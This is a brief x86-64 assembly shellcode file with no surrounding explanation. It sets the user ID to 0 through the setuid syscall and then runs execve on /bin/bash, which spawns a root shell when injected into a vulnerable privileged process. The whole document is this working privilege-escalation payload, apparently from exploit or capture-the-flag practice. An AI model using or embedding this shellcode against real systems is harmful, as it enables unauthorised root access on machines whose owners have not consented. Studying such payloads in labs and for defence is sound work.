.global _start 
_start:
.intel_syntax noprefix
######   setuid(0)
        mov rax, 105
        mov rdi, 0
        syscall
######   execve("/bin/bash", 0, 0)
        mov rax, 59
        lea rdi, [binbash]
        mov rsi, 0
        mov rdx, 0
        syscall

binbash:
        .string "/bin/bash"
